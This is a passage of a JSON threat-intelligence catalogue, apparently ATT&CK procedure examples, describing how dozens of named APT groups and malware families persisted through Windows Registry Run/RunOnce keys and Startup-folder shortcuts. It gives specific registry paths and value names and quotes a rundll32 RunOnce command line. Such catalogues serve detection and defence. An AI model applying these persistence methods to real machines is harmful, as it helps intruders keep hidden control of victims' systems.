Tools-%LOCALAPPDATA%\\."}, {"id": "G0007", "name": "APT28", "description": "APT28 has deployed malware that has copied itself to the startup directory for persistence."}, {"id": "G0016", "name": "APT29", "description": "APT29 added Registry Run keys to establish persistence."}, {"id": "G0022", "name": "APT3", "description": "APT3 places scripts in the startup folder for persistence."}, {"id": "G0050", "name": "APT32", "description": "APT32 established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly."}, {"id": "G0064", "name": "APT33", "description": "APT33 has deployed a tool known as DarkComet to the Startup folder of a victim, and used Registry run keys to gain persistence."}, {"id": "G0067", "name": "APT37", "description": "APT37's has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\."}, {"id": "G0087", "name": "APT39", "description": "APT39 has maintained persistence using the startup folder."}, {"id": "G0096", "name": "APT41", "description": "APT41 created and modified startup files for persistence. APT41 added a registry key in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost to establish persistence for Cobalt Strike."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has established persistence via the Startup folder or Run Registry key."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth creates a startup item for persistence. "}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer can place malicious executables in a victim's AutoRun registry key or StartUp directory, depending on the AV product installed, to maintain persistence."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon uses registry run keys for persistence."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has been executed via the RunOnce Registry key to run itself on safe mode."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea adds Registry Run keys to achieve persistence."}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS installs a registry Run key to establish persistence."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch establishes a foothold by adding a link to the malware executable in the startup folder."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can create or add files to Registry Run Keys to establish persistence."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has added itself to the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\ for persistence."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer has set the run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0089", "name": "BlackEnergy", "description": "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can establish persistence by writing the Registry value MicroNativeCacheSvc to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0204", "name": "Briba", "description": "Briba creates run key Registry entries pointing to malicious DLLs dropped to disk."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used a batch script that adds a Registry Run key to establish malware persistence."}, {"id": "S0471", "name": "build_downer", "description": "build_downer has the ability to add itself to the Registry Run key for persistence."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has maintained persistence by placing itself inside the current user's startup folder."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT establishes Persistence by setting the  HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load Registry key to point to its executable."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has added persistence via the Registry key software\\microsoft\\windows\\currentversion\\run\\microsoft windows html help."}, {"id": "S0144", "name": "ChChes", "description": "ChChes establishes persistence by adding a Registry Run key."}, {"id": "S1041", "name": "Chinoxy", "description": "Chinoxy has established persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key and by loading a dropper to (%COMMON_ STARTUP%\\\\eoffice.exe)."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can establish persistence by adding a Registry run key."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT creates an autostart Registry key to ensure persistence."}, {"id": "S0244", "name": "Comnie", "description": "Comnie achieves persistence by adding a shortcut of itself to the startup path in the Registry."}, {"id": "S0608", "name": "Conficker", "description": "Conficker adds Registry Run keys to establish persistence."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has dropped malicious files into the startup folder %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup on a compromised host in order to maintain persistence."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder."}, {"id": "S0046", "name": "CozyCar", "description": "One persistence mechanism used by CozyCar is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"}, {"id": "S0115", "name": "Crimson", "description": "Crimson can add Registry run keys for persistence."}, {"id": "S0235", "name": "CrossRAT", "description": "CrossRAT uses run keys for persistence on Windows."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal's version of Bandook adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet adds several Registry entries to enable automatic execution at every system startup."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate installation includes AutoIt script execution creating a shortcut to itself as an LNK object, such as bill.lnk, in the victim startup folder. DarkGate installation finishes with the creation of a registry Run key."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has been known to establish persistence by adding programs to the Run Registry key."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has established persistence via the Software\\Microsoft\\Windows NT\\CurrentVersion\\Run registry key and by creating a .lnk shortcut file in the Windows startup folder."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem can write itself to the Startup folder to gain persistence."}, {"id": "S0186", "name": "DownPaper", "description": "DownPaper uses PowerShell to add a Registry Run key in order to establish persistence."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has added the registry value ntdll to the Registry Run key to establish persistence."}, {"id": "S0062", "name": "DustySky", "description": "DustySky achieves persistence by creating a Registry entry in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0081", "name": "Elise", "description": "If establishing persistence by installation as a new service fails, one variant of Elise establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry keys for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self] and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD."}, {"id": "S0082", "name": "Emissary", "description": "Variants of Emissary have added Run Registry keys to establish persistence."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed adding the downloaded payload to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to maintain persistence."}, {"id": "S0363", "name": "Empire", "description": "Empire can modify the registry run keys HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has created Registry keys for persistence in [HKLM|HKCU]\\\u2026\\CurrentVersion\\Run."}, {"id": "S0152", "name": "EvilGrab", "description": "EvilGrab adds a Registry Run key for ctfmon.exe to establish persistence."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can achieve persistence through the Registry Run key."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke has used HKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Run to establish persistence."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT adds a shortcut file to the startup folder for persistence."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used Windows Registry run keys such as, HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\hosts to maintain persistence."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder."}, {"id": "S0355", "name": "Final1stspy", "description": "Final1stspy creates a Registry Run key to establish persistence."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher establishes persistence by creating the Registry key HKCU\\Software\\Microsoft\\Windows\\Run."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has dropped an executable file to the startup directory."}, {"id": "S0036", "name": "FLASHFLOOD", "description": "FLASHFLOOD achieves persistence by making an entry in the Registry's Run key."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has established persistence via the HKCU\\SOFTWARE\\microsoft\\windows\\currentversion\\run registry key."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can use a Registry Run Key and the Startup folder to establish persistence."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group tools have registered Run keys in the registry to give malicious VBS files persistence."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by creating a .lnk file in the Start menu."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can set persistence with a Registry run key."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has added a Registry Run key to establish persistence."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon establishes persistence in the Startup folder."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can create an autorun entry for a PowerShell script to run at reboot."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can use run keys and create link files in the startup folder for persistence."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used a persistence module that stores the implant inside the Registry, which executes at logon."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can set persistence with a Registry run key."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader can establish persistence via the Registry under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor  has added Registry Run keys to establish persistence."}, {"id": "S0170", "name": "Helminth", "description": "Helminth establishes persistence by creating a shortcut in the Start Menu folder."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can establish persistence with the auto start function including using the value EverNoteTrayUService."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor creates a Registry Run key to establish persistence."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa added a spoofed binary to the start-up folder for persistence."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn \"%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe\" to establish persistence."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has established persistence by creating a Registry run key."}, {"id": "G0100", "name": "Inception", "description": "Inception has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\."}, {"id": "S0259", "name": "InnaputRAT", "description": "Some InnaputRAT variants establish persistence by modifying the Registry key HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can place a lnk file in the Startup Folder to achieve persistence."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe can achieve persistence by adding itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0389", "name": "JCry", "description": "JCry has created payloads in the Startup directory to maintain persistence. "}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet creates a Registry Run key to establish persistence."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar adds a sub-key under several Registry run keys."}, {"id": "G0004", "name": "Ke3chang", "description": "Several Ke3chang backdoors achieved persistence by adding a Run key."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has placed scripts in the startup folder for persistence and modified the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce Registry key."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has added persistence to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS can set the AutoRun Registry key with a PowerShell command."}, {"id": "S0356", "name": "KONNI", "description": "A version of KONNI has dropped a Windows shortcut into the Startup folder to establish persistence."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can set an AutoRun key to establish persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has achieved persistence via writing a PowerShell script to the autorun registry key."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can create persistence by adding a shortcut in the CurrentVersion\\Run Registry key."}, {"id": "S0397", "name": "LoJax", "description": "LoJax has modified the Registry key \u2018HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute\u2019 from \u2018autocheck autochk \u2019 to \u2018autocheck autoche \u2019 in order to execute its payload during Windows startup."}, {"id": "S0582", "name": "LookBack", "description": "LookBack sets up a Registry Run key to establish a persistence mechanism."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can persist by setting Registry key values HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used malicious DLLs that setup persistence in the Registry Key HKCU\\Software\\Microsoft\\Windows\\Current Version\\Run."}, {"id": "S0409", "name": "Machete", "description": "Machete used the startup folder for persistence."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has used Registry Run keys to establish persistence."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka can establish persistence by adding Registry Run keys."}, {"id": "S0449", "name": "Maze", "description": "Maze has created a file named \"startup_vrun.bat\" in the Startup folder of a virtual machine to establish persistence."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can use Registry Run Keys for persistence."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has configured persistence to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, Spotify =% APPDATA%\\Spotify\\Spotify.exe and used .LNK files in the startup folder to achieve persistence."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu creates a link in the startup folder for persistence. Mispadu adds persistence via the registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0080", "name": "Mivast", "description": "Mivast creates the following Registry entry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia."}, {"id": "S0553", "name": "MoleNet", "description": "MoleNet can achieve persitence on the infected machine by setting the Registry run key."}, {"id": "G0021", "name": "Molerats", "description": "Molerats saved malicious files within the AppData and Startup folders to maintain persistence."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can establish persistence with the auto start function including using the value EverNoteTrayUService."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet used registry run keys for process execution during initial victim infection."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito establishes persistence under the Registry key HKCU\\Software\\Run auto_update."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has added Registry Run key KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding to establish persistence."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has created the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU to maintain persistence."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has modified a victim's Windows Run registry to establish persistence."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can achieve persistence through a Registry Run key."}, {"id": "S0034", "name": "NETEAGLE", "description": "The \"SCOUT\" variant of NETEAGLE achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE creates a Registry start-up entry to establish persistence."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\ and dropped a shortcut in %STARTUP%."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI has established persistence by writing the payload to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can gain persistence by a creating a shortcut in the infected user's Startup directory."}, {"id": "S0340", "name": "Octopus", "description": "Octopus achieved persistence by placing a malicious executable in the startup directory and has added the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to the Registry."}, {"id": "S0439", "name": "Okrum", "description": "Okrum establishes persistence by creating a .lnk shortcut to itself in the Startup folder."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, a first-stage downloader installed Rising Sun to %Startup%\\mssync.exe on a compromised host."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot maintains persistence following system checks through the Run key in the registry."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader establishes persistence via a Registry Run key."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE gains persistence by adding the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce."}, {"id": "S0013", "name": "PlugX", "description": "PlugX adds Run key entries in the Registry to establish persistence."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has added a registry key in the  hive for persistence."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates run key Registry entries pointing to a malicious executable dropped to disk."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke achieves persistence by using various Registry Run keys."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower sets up persistence with a Registry run key."}, {"id": "S0145", "name": "POWERSOURCE", "description": "POWERSOURCE achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0371", "name": "POWERTON", "description": "POWERTON can install a Registry Run key for persistence."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka adds itself to a Registry Run key with the name guidVGA or guidVSA."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has used Registry run keys to establish persistence."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon copies itself to the Startup folder to establish persistence."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY has been observed using a Registry Run key."}, {"id": "S0192", "name": "Pupy", "description": "Pupy adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "G0024", "name": "Putter Panda", "description": "A dropper used by Putter Panda installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can maintain persistence by creating an auto-run Registry key."}, {"id": "S0262", "name": "QuasarRAT", "description": "If the QuasarRAT client process does not have administrator privileges it will add a registry key to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has created Registry Run keys to establish persistence."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will use a Registry key to achieve persistence through reboot, setting a RunOnce key such as: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce{random value name} = \"rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s \"{dropped copy path and file name}\"\"."}, {"id": "S0662", "name": "RCSession", "description": "RCSession has the ability to modify a Registry Run key to establish persistence."}, {"id": "S0172", "name": "Reaver", "description": "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has established persistence by creating entries in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys."}, {"id": "S0332", "name": "Remcos", "description": "Remcos can add itself to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0375", "name": "Remexi", "description": "Remexi utilizes Run Registry keys in the HKLM hive as a persistence mechanism."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has created a new registry entry at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of C:\\ProgramData\\Initech\\Initech.exe /run."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP has been placed in the start up folder to trigger execution upon user login."}, {"id": "G0106", "name": "Rocke", "description": "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence."}, {"id": "S0090", "name": "Rover", "description": "Rover persists by creating a Registry entry in HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\."}, {"id": "S0148", "name": "RTM", "description": "RTM tries to add a Registry Run key under the name \"Windows Update\" to establish persistence."}, {"id": "G0048", "name": "RTM", "description": "RTM has used Registry run keys to establish persistence for the RTM Trojan and other tools, such as a modified version of TeamViewer remote desktop software."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT adds itself to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence upon reboot."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used the Windows command line to create a Registry entry under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence."}, {"id": "S0085", "name": "S-Type", "description": "S-Type may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has established persistence by being copied to the Startup directory or through the \\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key."}, {"id": "S0074", "name": "Sakula", "description": "Most Sakula samples maintain persistence by setting the Registry Run key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege. "}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt creates a Registry entry to ensure infection after reboot under HKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper may attempt to establish persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ run key."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has the ability to create persistence for the malware using the Registry autorun key and startup folder."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has installed a registry based start-up key HKCU\\Software\\microsoft\\windows\\CurrentVersion\\Run to maintain persistence should other methods fail."}, {"id": "S0028", "name": "SHIPSHAPE", "description": "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has added paths to executables in the Registry to establish persistence."}, {"id": "G0091", "name": "Silence", "description": "Silence has used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, and the Startup folder to establish persistence."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can establish a LNK file in the startup folder for persistence."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve has the ability to add itself to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift for persistence."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has used reg.exe to create a Registry Run key."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can create a VBS file in startup to persist after system restarts."}, {"id": "S0159", "name": "SNUGRIDE", "description": "SNUGRIDE establishes persistence through a Registry Run key."}, {"id": "S0035", "name": "SPACESHIP", "description": "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder."}, {"id": "S0058", "name": "SslMM", "description": "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE can establish persistence by installing itself in the startup folder, whereas the GO variant has created a HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookM registry key."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can use the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key for persistence."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot has been known to establish persistence by adding programs to the Run Registry key."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can use a Registry Run key to establish persistence."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has modified the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key for persistence."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can copy itself into the current user\u2019s Startup folder as \"Narrator.exe\" for persistence."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has added batch scripts to the startup folder."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390's malware can add a Registry key to Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can be loaded into the Startup folder (%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk) as a Shortcut file for persistence."}, {"id": "S0131", "name": "TINYTYPHON", "description": "TINYTYPHON installs itself under Registry Run key to establish persistence."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot can create a shortcut in the Windows startup folder for persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot establishes persistence in the Startup folder."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can create a link to itself in the Startup folder to automatically start itself upon system restart."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has created shortcuts in the Startup folder to establish 